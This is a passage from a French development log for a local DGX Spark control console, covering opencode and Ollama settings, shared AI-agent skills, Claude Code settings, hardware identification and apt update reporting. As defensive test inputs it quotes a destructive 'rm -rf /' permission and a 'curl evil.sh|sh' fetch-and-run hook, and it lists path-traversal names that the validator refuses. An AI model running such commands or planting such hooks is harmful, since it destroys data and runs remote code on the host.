répondent. **Limite non corrigeable par réglage** : Ollama ne fait pas de cache de préfixe sur les prompts
système répétés (2-4 s avant le premier token sur prompts longs) — c'est le vrai plafond pour un agent de
codage, et l'argument pour vLLM le jour où ce sera gênant.

### Application

- **Onglet ComfyUI masqué** (`hidden: true` dans le registre) — décision utilisateur, **le code reste en
  place** et se réactive en retirant ce drapeau. Les constats qui le ciblent gardent leur texte mais
  perdent leur bouton d'action (on ne propose pas d'ouvrir un onglet masqué).
- **Onglet opencode** : modèle par défaut, fenêtre de contexte (avec « Ollama serves: N » en regard),
  les 7 réglages de compaction, et le tableau des modèles déclarés avec pastille servi/non servi. Même
  pipeline `preview → confirmation → apply` que ComfyUI. Nouveau `restart.kind: "none"` (opencode relit sa
  configuration à chaque session) : ni bouton ni commande, juste la phrase.
- **Édition JSON** : aller-retour `JSON.parse`/`stringify` acceptable ici car le fichier est du JSON strict —
  mais **refus explicite si le fichier ressemble à du JSONC** (`//` ou `/*` hors chaîne), pour ne pas
  reproduire le risque de destruction de commentaires du `compose.yaml`. Garde-fou testé.
- **Deux règles inter-applications** : `opencode-context-mismatch` (high) et `opencode-model-drift` (medium).
  Elles ne se déclenchent pas aujourd'hui puisque tout est aligné — vérifié en les faisant délibérément
  déclencher sur une copie désalignée, une règle qui ne se déclenche jamais étant indiscernable d'une règle
  cassée.

### Bug trouvé en vérification, invisible pour les lots

L'API renvoyait `ollama.installed: []` et tous les modèles en « non servi » **en production seulement** :
le backend interrogeait `http://localhost:11434` depuis l'intérieur du conteneur, où `localhost` désigne le
conteneur lui-même. `ollama-api` vit sur le réseau `bridge`, spark-control-center sur `spark-control-center_default` :
ni `localhost`, ni le nom du conteneur, ni son IP directe ne fonctionnent — seule la passerelle hôte répond.
Conséquence : la règle `opencode-model-drift` criait au loup. Le lot n'a pas pu le voir, ayant testé en
lançant le backend sur l'hôte. Corrigé par `extra_hosts: host.docker.internal:host-gateway` + `OLLAMA_URL`
en variable d'environnement (défaut `localhost` pour que les tests hôte continuent de marcher).

## 2026-09-12 — Étape 3 : gestion des skills (partagée opencode / Claude Code)

### Le fait qui a déterminé la conception

`opencode debug skill` montre qu'opencode charge **automatiquement** les skills de Claude Code :
sa documentation intégrée liste `~/.claude/skills/<nom>/SKILL.md` et `~/.agents/skills/<nom>/SKILL.md`
sous « External skills (auto-loaded) ». Le partage n'est donc **pas un réglage** — il n'y avait aucun
interrupteur à construire, contrairement à l'intuition de départ. Les skills sont une ressource commune :
la surface de gestion vit dans un onglet `claude-code` (là où sont les fichiers), et l'onglet opencode y
renvoie par un bouton plutôt que de dupliquer l'interface.

### Deux pièges réels, désormais visibles dans l'UI

1. **Doublons** : `gepeto` et `pinokio` existent dans `~/.claude/skills/` ET `~/.agents/skills/`. Contenus
   identiques aujourd'hui, mais opencode résout `gepeto` depuis `~/.agents/` et `pinokio` depuis
   `~/.claude/` : éditer la mauvaise copie serait sans effet, silencieusement. Affiché en ambre sur chaque
   skill concernée.
2. **Lien de plugin** : `~/.claude/skills/watch` est un lien vers
   `~/.local/share/claude-plugins/claude-video/skills/watch`. L'éditer modifierait le plugin. Édition et
   bascule **refusées côté serveur (409) et désactivées dans le DOM** — vérifié : seul `watch` a ses deux
   contrôles en `disabled`.

### Livré

- `backend/skills.js` : scan des 3 racines, `GET /api/skills`, `GET /api/skills/:name`, `preview`/`apply`
  pour `toggle | content | create | import`. Désactivation par renommage en `.disabled` (même convention
  que les scripts ComfyUI). Réutilise `writePreserving`/`applyPlan`/`sha`/`buildLineDiff`.
- Onglet `claude-code` (liste, activation, édition, création, import depuis une URL **ou** un fichier lu
  par le navigateur via `FileReader`) et, côté opencode, un bouton `Skills`, la gestion de `skills.paths` /
  `skills.urls` et l'affichage des instructions (`AGENTS.md`, 68 lignes).

### Frontière de confiance

Un import écrit un fichier que deux outils d'IA chargeront automatiquement. Garde-fous, tous vérifiés
individuellement par l'orchestrateur : nom restreint à `^[a-z0-9][a-z0-9-]{0,63}$` (`../evil`, `..`, `.`,
`a/b`, `Bad Name`, `-lead`, `""` tous refusés, et aucun fichier créé hors racine) ; `https:` obligatoire
(`http:`, `file:`, `ftp:`, `javascript:` refusés) ; 256 Ko maximum ; frontmatter `name:`/`description:`
exigé ; refus d'écraser une skill existante ; refus sur lien symbolique. **L'aperçu affiche le contenu
intégral avant écriture** — seule occasion de relire ce qui va devenir actif.

### Corrections faites en vérification

- **Une seconde modale de confirmation avait été créée** pour les skills, copie de `EditConfirm` à
  l'URL d'écriture près. Deux modales sur des chemins d'écriture finissent par diverger — l'une recevra un
  garde-fou que l'autre n'aura pas. Unifiée par une prop `applyUrl` optionnelle : **une seule modale sert
  les trois chemins** (ComfyUI, opencode, skills), 107 lignes supprimées.
- **La suite `apps.test.js` était cassée depuis deux lots** et personne ne l'avait vue : ma passe de
  traduction avait changé « Renommage » en « Renaming » sans que les tests soient rejoués, et l'ajout des
  deux règles opencode invalidait `rules.length === 3`. Assertions corrigées, 9/9.
- **La skill `watch` disparaissait silencieusement** de la liste en production : son lien pointe hors des
  répertoires montés, donc il était cassé vu du conteneur. Corrigé en montant
  `~/.local/share/claude-plugins` **en lecture seule** (vérifié : `touch` y échoue). Limite résiduelle
  assumée : une skill dont le lien sort de tous les montages serait encore omise sans message.

## 2026-09-12 — Claude Code : settings, plugins et MCP exposés

Demande de l'utilisateur : exposer les settings, plugins et MCP de Claude Code. Tout est **visible** ;
l'édition est restreinte à une liste blanche, et ce choix est écrit dans l'interface plutôt que subi.

**Exposé** (onglet Claude Code, au-dessus des Skills) :
- **Settings** — les 3 fichiers réels : `settings.json`, `settings.local.json` (dont `permissions.allow`,
  106 entrées, affichées 10 par 10 avec un bouton pour tout déplier) et `settingsglm.json` (profil
  alternatif pointant sur une API tierce).
- **Plugins** — `ponytail@ponytail` 4.9.0, scope, date d'installation, état ; marketplaces
  `claude-plugins-official` et `ponytail`.
- **MCP** — aucun serveur déclaré dans `~/.claude.json`, ni global ni par projet ; les 5
  `plugin:engineering:*` viennent d'un plugin et attendent une authentification. Une note honnête plutôt
  qu'un tableau vide.
- **Hooks** — aucun configuré.

**Éditable** : `model`, `theme`, `effortLevel` et les deux drapeaux de notification, dans `settings.json`
uniquement. **Lecture seule assumée** : `permissions`, `hooks`, `enabledPlugins`, `extraKnownMarketplaces`.
La raison est affichée dans l'UI : cette application n'a pas d'authentification et dispose de `docker.sock` ;
écrire `permissions.allow` élargirait en silence ce que Claude Code s'autorise à exécuter, et écrire un
`hooks` serait une exécution de code arbitraire au prochain démarrage.

**Secret** : `settingsglm.json` contient un `ANTHROPIC_AUTH_TOKEN`. `mask()` est devenu récursif et
`AUTH` a rejoint `TOKEN|KEY|SECRET|PASSWORD`. Vérifié en production : zéro occurrence du jeton dans la
réponse d'API, la clé sort en `***`.

**Vérification de la barrière, hors interface** : le filtrage côté client n'est que de l'ergonomie. J'ai
envoyé directement à l'API de production un `permissions.allow` contenant `Bash(rm -rf /)` et un `hooks`
contenant `curl evil.sh|sh` — les deux refusés en 400, comme `enabledPlugins`, `extraKnownMarketplaces`
et une cible inconnue. `settings.json` de production inchangé (mtime, propriété, 106 entrées intactes).

### Bug trouvé en vérification — même famille que celui d'Ollama

L'interface annonçait « No MCP server is declared in **`/root/.claude.json`** ». Le code dérivait le chemin
de `os.homedir()`, qui vaut `/root` dans le conteneur : le fichier n'y existe pas, la lecture MCP ne lisait
donc **rien**. La liste vide était juste par accident — un serveur MCP ajouté demain serait resté invisible.
Le lot ne pouvait pas le voir : il avait testé sur l'hôte (où `homedir` vaut `/home/sparks`) et via une
surcharge `CLAUDE_JSON`. Corrigé en dérivant le chemin de `CLAUDE_DIR`. Prouvé après coup : le fichier est
bien lu depuis le conteneur (66 clés, 7 projets) et `mcpServers` en est réellement absent.

## 2026-09-12 — Identité machine et portabilité entre déclinaisons du DGX Spark

Objectif : l'application doit s'installer sur d'autres déclinaisons (GB300…) et chez d'autres
constructeurs (Dell, HP, Asus, Lenovo…). Deux verrous : rien n'identifiait la machine, et « GB10 » était
codé en dur dans la navigation.

### Sources retenues, toutes vérifiées lisibles depuis le conteneur

| Information | Source |
|---|---|
| Marque, modèle, BIOS | `/sys/class/dmi/id/{sys_vendor,product_name,board_vendor,chassis_vendor,bios_*}` |
| Numéros de série | DMI `product_serial` / `board_serial` (`-r--------` root : lisibles par le conteneur, pas par un shell utilisateur) |
| Plateforme DGX | `/etc/dgx-release` (`DGX_NAME`, `DGX_PRETTY_NAME`, `DGX_SWBUILD_VERSION`, `DGX_OTA_VERSION`…) |
| Puce | `nvidia-smi` — `NVIDIA GB10` → `GB10`, `NVIDIA GB300` → `GB300` |
| MAC | `/host/sys/class/net/*/address`, via un montage de `/sys` |
| IP | `/proc/1/net/fib_trie`, grâce à `pid: host` |

Écartés après essai : **device tree** (absent sur cette machine malgré l'ARM64, DMI fait foi) ;
**`/proc/1/root/...`** (EACCES, Docker le bloque) ; **montage du seul `/sys/class/net`** (liste les
interfaces mais ne peut rien lire dedans, les entrées étant des liens vers `/sys/devices`).

Le conteneur ayant son propre namespace réseau, `/sys/class/net` n'y montre que `eth0`/`lo` : d'où le
montage de `/sys` entier en lecture seule. Aucun privilège ajouté, pas de `network_mode: host`.

Sur cette machine : Dell Inc. · Dell Pro Max with GB10 FCM1253 · NVIDIA DGX Spark 7.2.3 (OTA 7.5.0) ·
GB10 · Ubuntu 24.04.4 LTS · aarch64 · `wlP9s9` 192.168.1.26 (défaut) et `enP7s7` down.
`product_serial` et `DGX_SERIAL_NUMBER` sont vides ; seul `board_serial` porte le numéro de service.
L'interface dit explicitement « Not exposed by firmware » quand les trois sont absents, plutôt que
d'afficher un champ vide.

### « GB10 » n'est plus écrit nulle part dans l'interface

L'étiquette de navigation, le sous-titre et le titre d'en-tête dérivent désormais de la puce détectée
(`chip.name`, repli `platform.name`, repli `Machine`), récupérée **une seule fois** et propagée en prop.
La clé de vue interne `'gb10'` reste inchangée : c'est un identifiant, pas un libellé.

### Portabilité des chemins

Les 6 chemins `/home/sparks/...` avaient déjà des variables d'environnement côté backend ; seuls le
`docker-compose.yml` et les valeurs par défaut les figeaient. Introduction de **`SPARK_HOME`**
(`${SPARK_HOME:-/home/sparks}`), utilisé des DEUX côtés de chaque montage pour que les chemins affichés
restent les vrais chemins de l'hôte, et posé explicitement dans `environment`. Ajout de `.env.example`.
Vérifié : sans `.env` le comportement est identique à avant ; avec `SPARK_HOME=/opt/autre`, montages et
variables suivent.

### Bug trouvé en vérification — troisième de la même famille

L'API rapportait `Ubuntu`… non : elle rapportait **`Debian GNU/Linux 12`**, la distribution de l'IMAGE du
conteneur, présentée comme celle de la machine — qui tourne sous Ubuntu 24.04.4 LTS. Le noyau, lui, était
juste, puisqu'il est partagé. Corrigé en montant `/etc/os-release` de l'hôte sous `/host/etc/os-release`
(avec repli sur `/etc/os-release` pour les exécutions hors Docker). Même racine que les bugs `localhost`
et `os.homedir()` déjà consignés : du code qui lit à l'intérieur du conteneur ce qu'il prétend lire sur la
machine.

## 2026-09-12 — Mises à jour système affichées dans la console, sans passer par le DGX Dashboard

Question posée : peut-on afficher dans la console les mises à jour que montre le DGX Dashboard (port 11000) ?

### Pourquoi PAS l'API du dashboard — trois obstacles mesurés

Le service est `/opt/nvidia/dgx-dashboard-service/dashboard-service -port 11000 serve`
(`dgx-dashboard.service`), version d'API `0.29.2-2`, préfixe `v1`. Les endpoints existent bel et bien —
extraits du bundle `updates-BUsASj7K.js` : `/api/v1/updates/available`, `/api/v1/updates/list`,
`/api/v1/ota/status`. Mais :
1. **Authentification** : `/updates/available` et `/updates/list` renvoient **401**, le dashboard a une page
   de connexion. Le seul endpoint ouvert, `/api/v1/ota/status`, ne renvoie que `{"isTorn": false}` — aucune
   information de contenu.
2. **Écoute limitée à `127.0.0.1`** : le conteneur reçoit `ECONNREFUSED` (vérifié). Il faudrait passer en
   réseau hôte ou monter un relais.
3. **API interne non documentée** (`gitlab-master.nvidia.com/digits-dx/...`), qui changera sans préavis.
Stocker les identifiants du dashboard dans une application sans authentification disposant de `docker.sock`
aurait été un très mauvais échange — écarté.

### La source réelle est apt, et elle est ouverte

Le dashboard ne fait que présenter apt. Dépôts DGX/NVIDIA configurés (`dgx.sources`, `cuda-compute-repo`,
`nvhpc`…), 77 paquets mettables à jour dont le noyau `6.17.0-1032.32 → 7.0.0-1019.19~24.04.2`.
Et le système calcule déjà le résumé : `/var/lib/update-notifier/updates-available` (world-readable,
entretenu par `apt-daily.timer` et `update-notifier-download.timer`), plus la date du dernier `apt update`
réussi via le mtime de `/var/lib/apt/periodic/update-success-stamp`.

### Livré

- `GET /api/updates` : résumé (85 mises à jour dont 14 de sécurité, ESM activé, date du dernier contrôle)
  lu directement des fichiers système, et liste détaillée des paquets lue depuis
  `/var/lib/spark-control-center/updates.json`.
- `host/dgx-updates/` : script + `.service` + `.timer` (horaire, plus au démarrage) qui capture
  `apt list --upgradable` en JSON. **Le script ne lance jamais `apt-get update` ni `apt upgrade`** — la
  machine a déjà ses propres minuteries pour ça ; écriture atomique, `0644`. Non installé : la commande est
  documentée dans les deux README, et l'API le dit (`pipelineInstalled:false` + une note explicite plutôt
  qu'une liste vide silencieuse).
- Règle `system-updates-pending` : **high** s'il existe des mises à jour de sécurité, **medium** sinon.
  C'est la première règle dont la gravité dépend des faits : `severity`/`why` peuvent être des fonctions,
  résolues par un simple `typeof === 'function'` dans `insights.js`.
- Carte « System updates » en lecture seule, liste tronquée à 10 avec dépliage.

### Sens du flux — différence importante avec le pipeline gb10-tuning

Ici le flux va **uniquement de la machine vers l'application** : une minuterie écrit un JSON, l'app le lit.
Rien de ce que l'app écrit ne déclenche de commande. Il n'y a donc **aucune frontière de confiance à
défendre et aucune liste blanche nécessaire** — consigne explicite donnée au lot pour qu'il n'en invente
pas une par mimétisme du pipeline GPU.

**Aucun bouton d'installation**, décision de l'utilisateur : l'installation reste au DGX Dashboard ou à
apt, et l'interface le dit (« this console only reports »).

### Écart de comptage assumé

Le système annonce 85, `apt list --upgradable` en liste 77 : update-notifier compte aussi les mises à jour
ESM et échelonnées. Les deux chiffres sont affichés, avec une phrase qui explique l'écart plutôt que d'en
choisir un arbitrairement.
